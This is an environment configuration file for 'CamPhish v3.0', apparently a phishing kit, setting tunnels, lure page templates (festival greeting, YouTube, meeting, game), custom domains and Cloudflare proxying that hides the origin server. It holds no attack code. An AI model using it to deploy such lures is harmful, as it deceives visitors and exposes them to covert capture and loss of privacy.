# =============================================================================
# CamPhish v3.0 — Docker + Pack Buildpacks Configuration
# =============================================================================

# --- Deployment Mode ---
# local       = Docker on local machine with tunnel (ngrok/cloudflared)
# self-hosted = VPS with reverse proxy + custom domain + optional Cloudflare DNS
# coolify     = Coolify-compatible deployment (no tunnel, proxy handled by Coolify)
DEPLOY_MODE=local

# --- Tunnel (local mode only) ---
# ngrok       = ngrok tunnel (requires NGROK_AUTHTOKEN)
# cloudflared = Cloudflare Tunnel (no auth required)
# none        = No tunnel (self-hosted/coolify modes)
TUNNEL=cloudflared

# --- Ngrok ---
NGROK_AUTHTOKEN=

# --- Build Configuration ---
# Builder image for pack CLI
BUILDER=heroku/builder:24
# OCI image name
IMAGE_NAME=camphish-app
# Optional: push to registry (e.g. ghcr.io/myuser/camphish)
IMAGE_REGISTRY=

# --- Dashboard ---
DASHBOARD_PORT=8080

# --- Session ---
SESSION_NAME=default
AUTO_CLEANUP=false

# --- Template ---
# 1 = Festival Wishing, 2 = Live YouTube TV, 3 = Online Meeting, 4 = Face Runner (game)
# URL path routing: /f → festival, /y → youtube, /m → meeting, /g → game
DEFAULT_TEMPLATE=1
FESTIVAL_NAME=NewYear
YOUTUBE_VIDEO_ID=dQw4w9WgXcQ

# --- Data Directory ---
DATA_DIR=./data

# --- Logs ---
LOG_TAIL=100

# =============================================================================
# Self-Hosted / VPS Mode
# =============================================================================

# Domain name (e.g. example.com)
DOMAIN=

# Subdomain for CamPhish (e.g. camphish -> camphish.example.com)
SUBDOMAIN=camphish

# Reverse proxy choice: caddy | traefik | nginx
PROXY=caddy

# Let's Encrypt email for automatic TLS certificates
LETSENCRYPT_EMAIL=

# =============================================================================
# Cloudflare DNS Integration (optional, for self-hosted mode)
# =============================================================================

# Cloudflare API token (needs Zone:DNS:Edit permission)
CF_API_TOKEN=

# Cloudflare Zone ID (find in Cloudflare dashboard under your domain)
CF_ZONE_ID=

# Orange cloud (proxy) enabled: true | false
# true  = Cloudflare proxies traffic (hides origin IP, adds CF protection)
# false = DNS-only mode (direct to origin, no CF proxy)
CF_ORANGE_CLOUD=false

# =============================================================================
# Coolify Mode
# =============================================================================

# FQDN for Coolify (set in Coolify dashboard, not here)
# COOLIFY_FQDN=camphish.example.com

# =============================================================================
# Proxy-specific settings
# =============================================================================

# Caddy
CADDY_IMAGE=caddy:2-alpine
CADDY_HTTP_PORT=80
CADDY_HTTPS_PORT=443

# Traefik
TRAEFIK_IMAGE=traefik:v3.3
TRAEFIK_HTTP_PORT=80
TRAEFIK_HTTPS_PORT=443
TRAEFIK_DASHBOARD_PORT=8081

# Nginx
NGINX_IMAGE=nginx:alpine
NGINX_HTTP_PORT=80
NGINX_HTTPS_PORT=443
